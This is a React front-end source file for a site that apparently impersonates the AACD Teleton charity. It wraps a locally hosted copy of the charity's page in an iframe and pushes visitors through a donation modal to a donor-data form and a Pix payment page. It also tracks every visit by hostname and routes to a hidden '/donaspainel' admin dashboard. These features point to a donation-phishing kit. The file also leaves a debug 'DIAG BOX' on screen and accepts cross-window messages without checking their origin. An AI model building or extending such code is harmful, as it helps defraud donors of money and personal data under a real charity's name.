import React, { useEffect, useRef, useState } from "react";
import { createPortal } from "react-dom";
import "./App.css";
import { BrowserRouter, Routes, Route, Navigate, useNavigate } from "react-router-dom";
import axios from "axios";
import PixPaymentPage from "./components/PixPaymentPage";
import LoginPage from "./components/LoginPage";
import AdminDashboard from "./components/AdminDashboard";

import DonorDataPage from "./components/DonorDataPage";

const API = '/api';

const HomePage = () => {
  const navigate = useNavigate();
  const iframeRef = useRef(null);
  const [isMobile, setIsMobile] = useState(false);
  const [showModal, setShowModal] = useState(true);

  const handleModalDonate = () => {
    setShowModal(false);
    navigate('/doacao/dados', { state: { value: 55 } });
  };

  useEffect(() => {
    const mq = window.matchMedia('(max-width: 1024px)');
    setIsMobile(mq.matches);
    const onChange = (e) => setIsMobile(e.matches);
    mq.addEventListener('change', onChange);

    const handler = (event) => {
      const data = event.data || {};
      if (data.type === 'aacd-donate') {
        const value = parseFloat(data.value) || 55;
        navigate('/doacao/dados', { state: { value } });
      }
    };
    window.addEventListener('message', handler);
    return () => {
      window.removeEventListener('message', handler);
      mq.removeEventListener('change', onChange);
    };
  }, [navigate]);

  const handleMobileConfirm = () => {
    const win = iframeRef.current && iframeRef.current.contentWindow;
    if (win) win.postMessage({ type: 'aacd-confirm-request' }, '*');
  };

  return (
    <div style={{ position: 'relative', minHeight: '100vh' }}>
      <div data-testid="diag-red-box" style={{ position: 'fixed', top: '10px', left: '10px', width: '220px', height: '60px', background: 'red', color: '#fff', zIndex: 99999, fontSize: '20px', fontWeight: 'bold', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>DIAG BOX</div>
      <iframe
        ref={iframeRef}
        title="Teleton AACD"
        src="/aacd.html?v=20260606d"
        data-testid="home-aacd-frame"
        style={{ border: 'none', width: '100%', height: '100vh', display: 'block' }}
      />

      {showModal && createPortal((
        <div
          data-testid="home-donate-modal-overlay"
          onClick={() => setShowModal(false)}
          style={{
            position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
            width: '100vw', height: '100vh', zIndex: 2147483600,
            background: 'rgba(23,16,40,0.78)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            padding: '20px', opacity: 1,
          }}
        >
          <div
            data-testid="home-donate-modal"
            onClick={(e) => e.stopPropagation()}
            style={{
              position: 'relative', width: '100%', maxWidth: '460px',
              background: '#ffffff', borderRadius: '20px', overflow: 'hidden',
              boxShadow: '0 30px 80px rgba(0,0,0,0.45)',
              fontFamily: 'Montserrat, sans-serif',
              animation: 'aacdPopIn 0.3s cubic-bezier(0.18,0.89,0.32,1.28)',
            }}
          >
            <button
              data-testid="home-donate-modal-close"
              onClick={() => setShowModal(false)}
              aria-label="Fechar"
              style={{
                position: 'absolute', top: '12px', right: '12px', zIndex: 3,
                width: '36px', height: '36px', borderRadius: '50%', border: 'none',
                background: 'rgba(0,0,0,0.45)', color: '#fff', fontSize: '20px',
                lineHeight: '36px', cursor: 'pointer', padding: 0,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
              }}
            >
              ×
            </button>

            <div style={{ position: 'relative', width: '100%', aspectRatio: '16 / 9', background: '#2a1e45' }}>
              <img
                src="/modal-bg.webp"
                alt="Teleton AACD"
                style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }}
              />
              <div style={{
                position: 'absolute', inset: 0,
                background: 'linear-gradient(to bottom, rgba(0,0,0,0.05) 40%, rgba(0,0,0,0.55) 100%)',
              }} />
              <img
                src="/modal-logo.png"
                alt="AACD Teleton"
                style={{
                  position: 'absolute', top: '16px', left: '20px',
                  width: '130px', height: 'auto', zIndex: 2,
                  filter: 'drop-shadow(0 2px 6px rgba(0,0,0,0.35))',
                }}
              />
            </div>

            <div style={{ padding: '24px 26px 28px', textAlign: 'center' }}>
              <h2 style={{
                margin: '0 0 8px', color: '#2a1e45', fontSize: '22px', fontWeight: 800,
                lineHeight: 1.2,
              }}>
                Sua doação transforma vidas
              </h2>
              <p style={{ margin: '0 0 22px', color: '#555', fontSize: '14px', lineHeight: 1.5 }}>
                Ajude a AACD a oferecer reabilitação para crianças e adultos com deficiência.
              </p>
              <button
                data-testid="home-donate-modal-cta"
                onClick={handleModalDonate}
                style={{
                  width: '100%', border: 'none', cursor: 'pointer',
                  background: '#eb1941', color: '#fff',
                  fontFamily: 'Montserrat, sans-serif', fontWeight: 700,
                  fontSize: '16px', textTransform: 'uppercase', letterSpacing: '0.5px',
                  padding: '16px 20px', borderRadius: '999px',
                  boxShadow: '0 8px 20px rgba(235,25,65,0.35)',
                  transition: 'transform 0.15s ease, filter 0.15s ease',
                }}
                onMouseEnter={(e) => { e.currentTarget.style.filter = 'brightness(1.08)'; e.currentTarget.style.transform = 'translateY(-1px)'; }}
                onMouseLeave={(e) => { e.currentTarget.style.filter = 'none'; e.currentTarget.style.transform = 'none'; }}
              >
                Doar agora
              </button>
            </div>
          </div>
        </div>
      ), document.body)}

      {isMobile && (
        <button
          data-testid="mobile-confirm-donation-btn"
          onClick={handleMobileConfirm}
          style={{
            position: 'fixed',
            left: 0,
            right: 0,
            bottom: 0,
            width: '100%',
            zIndex: 2147483000,
            border: 'none',
            background: '#eb1941',
            color: '#fff',
            fontFamily: 'Montserrat, sans-serif',
            fontWeight: 700,
            fontSize: '16px',
            textTransform: 'uppercase',
            letterSpacing: '0.5px',
            padding: '16px 14px',
            boxShadow: '0 -2px 12px rgba(0,0,0,0.18)',
            cursor: 'pointer',
          }}
        >
          Confirmar Doação
        </button>
      )}
    </div>
  );
};

function App() {
  useEffect(() => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    axios.post(`${API}/admin/visits/track`, { device: isMobile ? 'Mobile' : 'Desktop', origin: window.location.hostname }).catch(() => {});
  }, []);

  return (
    <div className="App">
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/doacao/dados" element={<DonorDataPage />} />
          <Route path="/doacao/pix" element={<PixPaymentPage />} />
          <Route path="/donaspainel" element={<LoginPage />} />
          <Route path="/donaspainel/dashboard" element={<AdminDashboard />} />
          <Route path="*" element={<Navigate to="/" replace />} />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;